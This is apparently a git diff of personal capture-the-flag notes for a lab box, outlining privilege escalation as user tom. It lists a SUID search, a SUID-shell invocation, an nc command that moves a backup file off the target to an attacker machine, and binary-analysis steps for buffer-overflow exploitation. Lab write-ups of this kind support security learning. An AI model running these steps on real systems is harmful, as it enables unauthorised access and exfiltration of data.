@@ -112,6 +112,8 @@ searchsploit -m php/webapps/43560.py
 - always check for kernel exploits (priv escalation) & observe the processes run by tom, he is running scheduler.js script
 - using scheduler.js, escalate yourself to tom user & run LinEnum.sh again
 - search for SUID files
+- apply group ownership related files
+- get the backup file and do binary exploitation or buffer overflow exploitation
 
 ### Lessons Learned
 - Running gobuster through a proxy. In order to do that, go to burpsuite -> proxy -> options -> Add Proxy Listener (Binding: Specify Listen Port (8081), Request handling: Redirect to host: 10.10.10.58;Redirect to port: 3000)
@@ -148,4 +150,28 @@ db.tasks.find()
 /tmp/bluejay820 -p
 
 find / -perm -4000 2>/dev/null
+
+# after getting your shell as tom, run LinEnum.sh again
+
+
+# transfer the backup file to your attack box
+nc 10.10.14.25 8082 < backup
+nc -lnvp 8082 > backup
+md5sum backup
+
+# run strace
+strace backup
+
+# analyze the assembly
+r2 backup
+aaa
+
+# compile time protections
+gdb backup 
+checksec
+del 1 # delete all break points
+b 1 # set a breakpoint for main
+r # run the program
+jmpcall
+
 ```
